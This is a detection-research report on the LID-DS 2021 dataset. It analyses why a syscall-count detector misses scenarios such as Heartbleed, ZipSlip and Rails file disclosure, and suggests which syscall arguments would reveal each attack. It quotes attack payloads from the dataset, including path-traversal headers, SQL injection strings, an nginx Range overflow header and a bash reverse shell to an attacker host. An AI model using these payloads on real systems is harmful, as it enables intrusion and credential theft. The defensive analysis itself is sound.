# Hard LID-DS 2021 scenarios at the system-call level: what the exploits do, why a syscall-frequency detector misses them, and which observable would reveal each

Scope and method. Researched 29/10/2026. The LID-DS repository was shallow-cloned at commit `5b8e4143301240c705b09dacbff3a49d72c08fcf` (master, committed 2026-08-29), and every scenario's `main.py`, `exploit/`, `victim/` and `normal/` files were read. All LID-DS code links below are pinned to that commit (`LIDDS` = `https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf`). Third-party code was also read at the exact versions the scenarios use: Metasploit 6.1.5 (the version the exploit Dockerfiles check out), nginx release-1.6.3, Juice Shop v10.0.0 and Linux v5.10 `fs/read_write.c`.

The detection rates (5.8 %, 3.4 %, 16.7 %, 69.7 %, 63.6 %, 96.4 %, 100 %) come from the task brief, meaning the caller's own Pulse runs. They are not sourced here.

Nothing was checked against the actual recordings. The 87 GB LID-DS 2021 recordings are not on this host, and a live run was in progress on the lab. Every statement about what appears in a recording is therefore marked as inference. The Gaps sections list the checks needed to confirm each one.

Pulse context, from the local file `sentinel_pulse/lidds/convert.py`: Pulse scores LID-DS as 0.5 s windows of syscall-ID counts and transition bins. Each line has the format `timestamp_ns user_id process_id process_name thread_id syscall direction args...`, so the arguments exist in the data even though Pulse does not use them.

---

## Q1. What does each exploit script do, what does the victim do differently, and how does the normal behaviour compare?

### Takeaway
All six hard scenarios share one pattern. The exploit takes the same code path in the victim that the normal users already take: the same process, the same request handler, and the same child-process spawn where there is one. The attack differs only in arguments (file paths), byte counts, return values, or request rate. None of the six makes the victim start a process it would not start normally. All nine 100 % scenarios do the opposite: they make the victim run shell commands or tools (`bash`, `sh`, `wget`, `touch`, `uname`, `id`, `cat`), or they generate a large burst of attack traffic (sqlmap, brute-force loops, port scans).

### Cited Findings

**Framework facts that apply to every scenario**
- Recording: `sysdig -w <file> -s 1600 container.name=<victim>` captures only the victim container's syscalls, with I/O buffers cut to 1600 bytes. A `tcpdump` pcap of the victim's traffic is recorded alongside. — [LIDDS/lid_ds/core/objects/victim.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/lid_ds/core/objects/victim.py)
- The exported text format is `%evt.rawtime %user.uid %proc.pid %proc.name %thread.tid %syscall.type %evt.dir %evt.args`, so the arguments (paths, fds, `res=`, sizes, data) are kept. — [LIDDS/lid_ds/export/export.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/lid_ds/export/export.py)
- The LID-DS 2021 authors state that recordings contain "the system calls (incl. arguments, return values and other meta-data), network data and other statistics of the victim". Normal-user timings are sampled from real-world webserver logs. — [Extended Abstract: LID-DS 2021 (Grimmer et al., CRITIS 2022)](https://dbs.uni-leipzig.de/files/research/publications/2023-07/pdf/CRITIS_2022_Extended_Abstract_LID-DS-2021.pdf)

**CVE-2014-0160 Heartbleed (detector: 5.8 %)**
- Victim: `ubuntu:13.04` with distro `apache2`, `php5`, `libapache2-mod-php5` and mod_ssl on port 443, serving the "unapp" template plus a Basic-auth-protected `/private/upload.php` that saves uploaded files with `move_uploaded_file`. — [LIDDS/scenarios/CVE-2014-0160/victim/Dockerfile](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2014-0160/victim/Dockerfile), [upload.php](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2014-0160/victim/upload.php), [default-ssl](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2014-0160/victim/default-ssl)
- Exploit: Python starts `msfrpcd`, loads the Metasploit module `auxiliary/scanner/ssl/openssl_heartbleed` with only `RHOSTS` set, and runs it once when the framework writes a line to its stdin. Metasploit is checked out at tag 6.1.5. — [LIDDS/scenarios/CVE-2014-0160/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2014-0160/exploit/exploit.py), [exploit/Dockerfile](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2014-0160/exploit/Dockerfile)
- With the module defaults (`DefaultAction` SCAN, `LEAK_COUNT` 1, `TLS_VERSION` 1.0, `HEARTBEAT_LENGTH` 65535), `bleed()` opens one TCP connection and sends a Client Hello. It waits only for the Server Hello, without finishing the handshake. It then sends one heartbeat request whose payload is just `"\x01"` plus the 2-byte length 65535, so there are no payload bytes. It reads up to 65535 bytes back and disconnects. — [Metasploit 6.1.5 openssl_heartbleed.rb](https://github.com/rapid7/metasploit-framework/blob/6.1.5/modules/auxiliary/scanner/ssl/openssl_heartbleed.rb)
- The normal behaviour also sends TLS heartbeats, and they are legitimate. Each client action is a POST upload of 1,000 to 10,000 random bytes (30 %), a GET via `webbrowser.open` (50 %), or a heartbeat (20 %). The heartbeat code sends a Client Hello, stops after the first handshake record (exactly like Metasploit), and sends a heartbeat whose declared length equals its real payload length: a random 4,073 to 16,364 bytes plus 16 bytes of padding. — [LIDDS/scenarios/CVE-2014-0160/normal/client.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2014-0160/normal/client.py), [normal/heartbeat.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2014-0160/normal/heartbeat.py)
- Heartbleed reveals up to 64 KB of memory per heartbeat, and attacks can be repeated. Exploitation "does not leave any trace of anything abnormal happening to the logs". Affected versions are OpenSSL 1.0.1 through 1.0.1f. — [heartbleed.com](https://heartbleed.com/)

**ZipSlip (detector: 3.4 %)**
- Victim: `ubuntu:16.04` running a Python `http.server` (`ZipService.py`) on port 8000. A PUT saves the body under `os.path.basename(path)` in `/service/upload`. Then, for every upload, it runs `subprocess.Popen(["java","-cp","../zipslip-1.0.0.jar","com.itsec.leipzig.zipslip.Unpack", filename])`. The Dockerfile has no `USER` line. — [LIDDS/scenarios/ZipSlip/victim/ZipService.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/ZipSlip/victim/ZipService.py), [victim/Dockerfile](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/ZipSlip/victim/Dockerfile)
- `Unpack.java` creates `new File(newPath, entry.getName())` without validating the name. It calls `getParentFile().mkdirs()` and writes the entry through a `FileOutputStream` in 2048-byte chunks. — [LIDDS/scenarios/ZipSlip/ZipSlip_Unpack/.../Unpack.java](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/ZipSlip/ZipSlip_Unpack/src/main/java/com/itsec/leipzig/zipslip/Unpack.java)
- Exploit: `curl -X PUT --upload-file /home/evil.zip`, then `killall sleep`. `evil.zip` holds a single entry containing `BAD THING EVIL`, renamed with `zipnote` to `../../../../../../../../../../etc/passwd`. — [LIDDS/scenarios/ZipSlip/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/ZipSlip/exploit/exploit.py), [exploit/gen_evil_zip.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/ZipSlip/exploit/gen_evil_zip.sh)
- Normal: each user sends a randomly chosen zip with the same `curl -X PUT`. The zips are 2,097,152-byte splits of the German Wikipedia abstracts XML dump, each zipped. — [LIDDS/scenarios/ZipSlip/normal/normal.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/ZipSlip/normal/normal.py), [prepare_zips.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/ZipSlip/prepare_zips.py)
- Zip Slip uses "a specially crafted archive that holds directory traversal filenames". In vulnerable Java code, `e.getName()` "is concatenated with the target directory ... without being validated". The result is arbitrary file overwrite, which typically leads to RCE. — [Snyk: Zip Slip](https://security.snyk.io/research/zip-slip-vulnerability)

**CVE-2019-5418 Rails file content disclosure (detector: 16.7 %)**
- Victim: `ruby:2.5.1` running `rails s` (no environment set) on port 3000. The Gemfile requires `rails ~> 5.2.1`. Every route is a controller that does `render file: "#{Rails.root}/routes_src/<x>.md"`, including `/chybeta`, which renders `README.md`. — [LIDDS/scenarios/CVE-2019-5418/victim/Dockerfile](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2019-5418/victim/Dockerfile), [chybeta_controller.rb](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2019-5418/victim/rails/app/controllers/chybeta_controller.rb), [routes.rb](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2019-5418/victim/rails/config/routes.rb)
- Exploit: a single `curl "<ip>:3000/chybeta" -H "Accept: ../../../../../../../../../../etc/passwd{{"`, then `pkill -f sleep`. — [LIDDS/scenarios/CVE-2019-5418/exploit/exploit.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2019-5418/exploit/exploit.sh)
- Normal: a random walk with `urllib.request.urlopen` over `chybeta` and `site1` to `site5`, which are the same controllers. The exploited endpoint `/chybeta` is therefore visited normally too. — [LIDDS/scenarios/CVE-2019-5418/normal/randomwalk.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2019-5418/normal/randomwalk.py)
- Advisory: "Specially crafted accept headers in combination with calls to `render file:`" can render arbitrary files. Affected: Action View 5.2.0 to 5.2.2.0, among other lines. — [GitHub Advisory GHSA-86g5-2wh3-gc9j](https://github.com/advisories/GHSA-86g5-2wh3-gc9j)
- Mechanism: the payload lands in `details[formats]`. Because the view is outside the app, the resolver uses `find_all_anywhere`, which skips the cache, then `find_templates`, then `query`/`build_query`. After `File.expand_path`, the lookup pattern becomes `/etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}`, so `/etc/passwd` matches as a template. — [chybeta, Analysis for CVE-2019-5418](https://chybeta.github.io/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails/)

**CVE-2017-7529 nginx range filter (detector: 69.7 %)**
- Victim: `ubuntu:14.04` with nginx 1.6.3 built from source. It is configured with `--error-log-path=/var/log/nginx/error.log` and `--http-log-path=/var/log/nginx/access.log` and serves the static "unapp" pages. No custom `nginx.conf` is copied, so the stock one is used. — [LIDDS/scenarios/CVE-2017-7529/victim/Dockerfile](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2017-7529/victim/Dockerfile)
- The stock nginx 1.6.3 `nginx.conf` has `worker_processes 1;` and `sendfile on;`, and no `proxy_cache`. — [nginx release-1.6.3 conf/nginx.conf](https://github.com/nginx/nginx/blob/release-1.6.3/conf/nginx.conf)
- Exploit, based on the en0f PoC:
  - It first does a plain GET to read `Content-Length`, then sets `Range: bytes=-{L},-9223372036854{776000-L}` with L = Content-Length + 623.
  - `check()` succeeds if the answer is a 206 whose body contains "Content-Range".
  - If it succeeds, the exploit keeps sending the same request until it has collected 128 distinct response lines, then runs `pkill -f sleep`.
  — [LIDDS/scenarios/CVE-2017-7529/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2017-7529/exploit/exploit.py)
- Normal: headless Chrome (Selenium) opens the site and keeps clicking a random internal link. — [LIDDS/scenarios/CVE-2017-7529/normal/normal.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2017-7529/normal/normal.py)
- Advisory: with standard modules the overflow lets an attacker "obtain a cache file header if a response was returned from cache". Only third-party modules could leak worker memory. Affected versions are 0.5.6 to 1.13.2. — [nginx security advisory, July 2017](https://mailman.nginx.org/pipermail/nginx-announce/2017/000200.html)
- In 1.6.3, `ngx_http_range_parse()` turns a suffix range into `start = content_length - end`, which can be negative, and accumulates `size += end - start` with no overflow check. The fix adds `if (size > NGX_MAX_OFF_T_VALUE - (end - start)) return NGX_HTTP_RANGE_NOT_SATISFIABLE;`. — [nginx 1.6.3 ngx_http_range_filter_module.c](https://github.com/nginx/nginx/blob/release-1.6.3/src/http/modules/ngx_http_range_filter_module.c); [nginx patch.2017.ranges.txt](https://nginx.org/download/patch.2017.ranges.txt)
- For a file-backed buffer, the multipart body sets `b->file_pos = buf->file_pos + range[i].start`. The overlapped-buffer check, which logs "range in overlapped buffers" at ALERT level, runs only when `!buf->last_buf`. — [nginx 1.6.3 ngx_http_range_filter_module.c](https://github.com/nginx/nginx/blob/release-1.6.3/src/http/modules/ngx_http_range_filter_module.c)
- nginx's Linux sendfile chain calls `sendfile(c->fd, file->file->fd, &offset, file_size)` and, on failure, `ngx_connection_error(c, err, "sendfile() failed")`. `ngx_connection_error` logs either at INFO or at ERR level. — [nginx 1.6.3 ngx_linux_sendfile_chain.c](https://github.com/nginx/nginx/blob/release-1.6.3/src/os/unix/ngx_linux_sendfile_chain.c); [ngx_connection.c](https://github.com/nginx/nginx/blob/release-1.6.3/src/core/ngx_connection.c)
- In the kernel, `do_sendfile()` calls `rw_verify_area(READ, in.file, &pos, count)`, and `rw_verify_area` returns `-EINVAL` when `pos < 0`, unless the file uses unsigned offsets. — [Linux v5.10 fs/read_write.c](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/fs/read_write.c?h=v5.10)

**Juice-Shop (detector: 63.6 %, almost only via the "new syscall ID" rule)**
- Victim: the official image `bkimminich/juice-shop:v10.0.0`, a Node.js app on port 3000. Its ORM is Sequelize with `dialect: 'sqlite'` and `storage: 'data/juiceshop.sqlite'`. — [LIDDS/scenarios/Juice-Shop/main.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/main.py); [juice-shop v10.0.0 models/index.js](https://github.com/juice-shop/juice-shop/blob/v10.0.0/models/index.js)
- There are three attack variants, one per recording. `record_all.sh` records 34 "normal and attack" recordings and 7 "only attack" recordings for each variant.
  - `SQLInjectionSchema`: a single `curl` to `/rest/products/search?q=qwert')) UNION SELECT sql,... FROM sqlite_master--`.
  - `SQLInjectionCred`: a single `curl` with `UNION SELECT id, email, password ... FROM Users--`.
  - `SQLInjectionUser`: headless Chrome opens `/#/login` and types a UNION payload as the email, which logs in as the non-existent `acc0unt4nt@juice-sh.op`.
  — [LIDDS/scenarios/Juice-Shop/exploit/run_attacker.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/exploit/run_attacker.py), [sql_injection_schema.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/exploit/sql_injection_schema.sh), [sql_injection_cred.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/exploit/sql_injection_cred.sh), [sql_injection_user.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/exploit/sql_injection_user.py), [record_all.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/record_all.sh)
- Normal: two Selenium users (`user_count = 2`) register, log in, then pick at random between shopping (basket, feedback), filing a complaint with a file upload, and checking out. — [LIDDS/scenarios/Juice-Shop/README.md](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/README.md), [main.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Juice-Shop/main.py)
- In v10.0.0, the search route builds raw SQL from the user's search text. If the schema or UNION challenge is unsolved, it runs follow-up checks, including an extra `SELECT sql FROM sqlite_master` query, then calls `utils.solve(...)`. Login builds `SELECT * FROM Users WHERE email = '${req.body.email}' ...` and solves `ephemeralAccountantChallenge`. — [juice-shop v10.0.0 routes/search.js](https://github.com/juice-shop/juice-shop/blob/v10.0.0/routes/search.js), [routes/login.js](https://github.com/juice-shop/juice-shop/blob/v10.0.0/routes/login.js)
- `utils.solve()` sets `challenge.solved = true` and calls `challenge.save()`, which is a database write. It logs "Solved challenge ..." through the logger and runs `global.io.emit('challenge solved', ...)`, a socket.io push to connected browsers. — [juice-shop v10.0.0 lib/utils.js](https://github.com/juice-shop/juice-shop/blob/v10.0.0/lib/utils.js)
- The Juice Shop companion guide describes these as the challenges "Database Schema", "User Credentials" and "Ephemeral Accountant". — [Pwning OWASP Juice Shop, Injection](https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html)

**Bruteforce_CWE-307 (detector: 96.4 %)**
- Victim and normal behaviour are "identical to CVE-2014-0160" (same Apache, mod_ssl, PHP image). `add_admin.sh` adds one extra Basic-auth user, with the username and password each drawn at random from the victim's copies of `http_default_users.txt` (14 entries) and `http_default_pass.txt` (19 entries). — [LIDDS/scenarios/Bruteforce_CWE-307/README.md](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Bruteforce_CWE-307/README.md), [victim/add_admin.sh](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Bruteforce_CWE-307/victim/add_admin.sh), [http_default_users.txt](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Bruteforce_CWE-307/victim/http_default_users.txt), [http_default_pass.txt](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Bruteforce_CWE-307/victim/http_default_pass.txt)
- Exploit: Metasploit `auxiliary/scanner/http/http_login` against `/private/upload.php` on port 443 over SSL, with the Metasploit `http_default_users`/`http_default_pass` wordlists, `STOP_ON_SUCCESS` true and guess limits of 10000. — [LIDDS/scenarios/Bruteforce_CWE-307/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Bruteforce_CWE-307/exploit/exploit.py)
- `http_login` first probes `AUTH_URI` with empty credentials and expects a 401. It then runs a `LoginScanner::HTTP` over the credential collection using GET by default (`REQUESTTYPE`). — [Metasploit 6.1.5 http_login.rb](https://github.com/rapid7/metasploit-framework/blob/6.1.5/modules/auxiliary/scanner/http/http_login.rb)
- In the Bruteforce scenario, normal users do GETs and POSTs (`-post 20`, so 20 % POST). A wrong password is used 5 % of the time, and a background thread sends a heartbeat every 60 to 120 s. — [LIDDS/scenarios/Bruteforce_CWE-307/main.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Bruteforce_CWE-307/main.py), [normal/client.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/Bruteforce_CWE-307/normal/client.py)

**Contrast: the nine scenarios caught at 100 %**
- CVE-2012-2122 (`vulhub/mysql:5.5.23`): the exploit loops over `mysql.connector.connect` with a wrong password, optionally with a 1 s or 5 s sleep, until the memcmp bypass succeeds, then runs `SELECT user, password FROM user`. — [LIDDS/scenarios/CVE-2012-2122/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2012-2122/exploit/exploit.py), [main.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2012-2122/main.py)
- CVE-2017-12635_6 (vulhub CouchDB): a chain of nmap port scan, an optional hydra brute force, admin creation (CVE-2017-12635), then RCE. The RCE sets `query_servers` to `echo -e 'bash -i >& /dev/tcp/<attacker>/4444 0>&1' > run.sh` and `bash run.sh`, and the reverse shell sends `ls`. — [LIDDS/scenarios/CVE-2017-12635_6/exploit/reverse-shell.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2017-12635_6/exploit/reverse-shell.py), [main.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2017-12635_6/main.py)
- CVE-2018-3760 (Sprockets, Rails 5.0.7 from vulhub): one GET to `/assets/file:%2f%2f/etc/passwd`, which the code labels `error_path`, then the traversal GET `/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/.../etc/passwd`. The normal behaviour is Selenium CRUD on a movie list backed by MySQL. — [LIDDS/scenarios/CVE-2018-3760/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2018-3760/exploit/exploit.py), [README.md](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2018-3760/README.md)
- CVE-2020-13942 (Apache Unomi 1.5.1 with Elasticsearch, same container): a POST to `/context.json` with an MVEL `Runtime.getRuntime().exec("touch /tmp/mvel")` or the OGNL equivalent. — [LIDDS/scenarios/CVE-2020-13942/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2020-13942/exploit/exploit.py), [README.md](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2020-13942/README.md)
- CVE-2020-23839 (GetSimple CMS 3.3.16): XSS tricks the admin (`trick_admin.py`), then `reverse_shell.py` POSTs the command `cat /etc/passwd` to the planted shell. — [LIDDS/scenarios/CVE-2020-23839/main.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2020-23839/main.py), [exploit/reverse_shell.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2020-23839/exploit/reverse_shell.py)
- CVE-2020-9484 (Tomcat): the exploit uploads a ysoserial `Groovy1` `.session` payload and `payload.sh`. It then sends `JSESSIONID=../../../../../usr/local/tomcat/upload-dir/<payload>`, which deserializes the session and runs `bash .../payload.sh`. The reverse shell runs `whoami` and `cat /etc/passwd`. — [LIDDS/scenarios/CVE-2020-9484/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CVE-2020-9484/exploit/exploit.py)
- CWE-89 (DVWA): Selenium logs in, then runs `sqlmap` in batch mode against `vulnerabilities/sqli/?id=1&Submit=Submit`. — [LIDDS/scenarios/CWE-89-SQL-injection/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/CWE-89-SQL-injection/exploit/exploit.py)
- EPS_CWE-434: the victim already runs `pstoedit -f plot-svg` as a child process for every normal upload. The evil EPS contains `(%pipe% wget https://raw.githubusercontent.com/...) (w) file`. — [LIDDS/scenarios/EPS_CWE-434/victim/ImageConverter.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/EPS_CWE-434/victim/ImageConverter.py), [exploit/image_0501.eps](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/EPS_CWE-434/exploit/image_0501.eps)
- PHP_CWE-434 (DVWA): the exploit uploads `evil_script.php` and requests it. The script runs `exec("uname -a")`, `exec("id")`, `exec("uname")` and `exec("wget https://github.com/LID-DS/LID-DS/$out1")`. — [LIDDS/scenarios/PHP_CWE-434/exploit/exploit.py](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/PHP_CWE-434/exploit/exploit.py), [exploit/evil_script.php](https://github.com/LID-DS/LID-DS/blob/5b8e4143301240c705b09dacbff3a49d72c08fcf/scenarios/PHP_CWE-434/exploit/evil_script.php)

### Inferences

**Heartbleed**
- On the victim, the attack is one TLS connection handled by an existing Apache worker: accept, read the Client Hello, write the Server Hello and certificate, read the heartbeat record, write the heartbeat response, close.
- The heartbeat record is 8 bytes on the wire: a 5-byte header plus `01 ff ff`.
- The response is about 65.5 KB: 3 + 65535 + 16 bytes of heartbeat message, probably split into several TLS records. The split was not checked in the OpenSSL source.
- The over-read itself is a `memcpy` inside OpenSSL in user space and creates no syscall.
- The normal client runs the same connect, Client Hello, early heartbeat, read flow. In normal traffic the heartbeat read is 4,097 to 16,388 bytes and the write is about the same size (an echo). So the syscall types and their order match the training data, and only the byte counts differ:
  - read about 8 bytes versus at least 4,097;
  - write about 65 KB versus at most about 16 KB;
  - response/request ratio about 8,000 versus about 1.
- This explains why a count-based detector finds about 6 %.

**ZipSlip**
- The exploit and the normal uploads take an identical process path: the Python server writes the zip, then forks and execs the same `java ... Unpack` command, and the JVM starts the same way.
- The differences:
  - one `openat` of `evil/../../../../../../../../../../etc/passwd`, with write/create/truncate flags, outside `/service/upload`;
  - a write of about 15 bytes;
  - far fewer write syscalls than a normal 2 MB extraction, which takes about 1,000 writes of 2048 bytes.
- For a count detector, the attack window looks like a smaller-than-usual normal upload, which explains 3.4 %.
- The container runs as root, so the overwrite of `/etc/passwd` succeeds.
- A possible secondary effect: later `java` runs (or anything that looks up a user name) read a corrupted `/etc/passwd`. Not verified.

**CVE-2019-5418**
- The exploit is one HTTP request to an endpoint the normal users visit. The puma/Rails process does the same work as for a normal `/chybeta` request, except that the template lookup's path calls (stat/open, or a directory scan) point into `/etc` and open `/etc/passwd`. The normal request opens `/app/routes_src/README.md` instead.
- The response is about 1 KB of `/etc/passwd`, comparable in size to the normal Markdown pages.
- Only the path argument separates the attack from normal traffic, which explains 16.7 %.

**CVE-2017-7529**
- In the LID-DS victim, the advertised leak (a cache file header) cannot happen: the stock `nginx.conf` defines no proxy cache and the files are static.
- Following the 1.6.3 code:
  - the crafted Range parses into two ranges with negative starts, and the summed size wraps to a negative number, so the `size > content_length` check passes;
  - the multipart file buffer gets a negative `file_pos`;
  - because a static file's buffer has `last_buf` set, the overlapped-buffer check is skipped;
  - `sendfile()` is called with a negative offset and returns `-EINVAL`;
  - nginx logs `sendfile() failed (22: Invalid argument)` to `/var/log/nginx/error.log`, assuming the ERR branch and the default level `error`, and drops the connection.
- The victim-side effect is therefore an error path: a failing `sendfile`, a write to `error.log`, and an aborted connection. That is a different syscall mix and a different return value from normal traffic, which may be why a count detector catches 69.7 %.
- Whether `check()` then passes, and how many requests the loop sends, depends on how python-requests handles the truncated multipart response. This needs checking in the recordings.
- A second possible distinguishing factor: the exploit fetches only `/` with python-requests, while normal users are Chrome sessions that also load every page asset (CSS, JS, images). The per-connection syscall mix therefore differs even for the exploit's benign first GET.

**Juice-Shop**
- All three variants are SQL injection inside the same Node.js process, against a SQLite file the normal users already read and write. No new process is created.
- What changes on the victim:
  - which database pages are read (the `sqlite_master` and `Users` tables);
  - one challenge-solve write to the database (the `Challenges` table);
  - a log line;
  - a socket.io push.
- A count detector gets almost nothing from this. That only a new-syscall-ID rule fires suggests that one syscall, reached through the challenge-solve path or the error/UNION path, never appears in the 2-user normal training data. Which syscall it is was not identified (see Gaps).
- `SQLInjectionUser` drives a full Chrome login page load, so most of its traffic looks like a normal login.

**Bruteforce**
- The attack is up to 14 × 19 = 266 credential pairs, and the scan stops on success. Assuming the victim's lists match the Metasploit lists, that means on average about half of the pairs, as fast HTTPS GETs that each end in 401. Normal traffic produces a 401 on only 5 % of POSTs.
- The result is a strong rate and count anomaly lasting well beyond one 0.5 s window, which explains 96.4 %.
- Recordings where the random admin pair is found within the first few guesses would have a very short burst. That is a candidate explanation for the misses, not verified.

**The 100 % scenarios**
- Every one except CVE-2018-3760 and CVE-2012-2122 makes the victim run a program it never runs in normal traffic. The program is `bash`/`sh`, `touch`, `wget`, `uname`, `id` or `cat`. Some of them also open outbound connections (`wget`, reverse shells to the attacker on port 4444).
- New execve calls, new process names and new syscall IDs are exactly what a frequency or novelty detector sees.
- CVE-2012-2122 and CWE-89 are dominated by request bursts: the brute-force loop and sqlmap.
- CVE-2018-3760 is a pure file read like CVE-2019-5418, yet it is caught at 100 %. A probable reason, not verified: the first `error_path` request raises an exception in Rails/Sprockets, and the error handling (backtrace, logging, asset lookup) produces syscalls the CRUD-only normal traffic never generates.

### Gaps
- The Ubuntu 13.04 OpenSSL package version (expected 1.0.1c) and the Apache MPM (prefork, because of mod_php) were not confirmed. Neither was whether a 64 KB heartbeat response leaves Apache as one `write`/`writev` or several.
- In the Heartbleed and Bruteforce normal clients, the "GET" action calls `webbrowser.open(url)` in a container where the virtual display code is commented out. Whether those GETs generate any traffic at all was not verified. If they do not, normal traffic is mostly POSTs and heartbeats, and that would make the attack heartbeat even more typical.
- CVE-2017-7529: the sendfile/EINVAL/error.log chain comes from reading the source, not the recording. To verify, grep a CVE-2017-7529 attack `.sc` for `sendfile` with `res=-22`, look for writes to the `error.log` fd, and compare the number of Range requests the exploit sent. The errno list behind `ngx_connection_error`'s INFO branch was not read.
- Juice-Shop: which syscall ID is "new" was not identified from code. To verify, diff the syscall-ID sets of the Juice-Shop attack recordings against the training recordings.
- No victim Dockerfile was reviewed for CVE-2012-2122 or Juice-Shop (both are prebuilt images).
- Exact Rails version: the Gemfile says `~> 5.2.1`, and `Gemfile.lock` was not read.

---

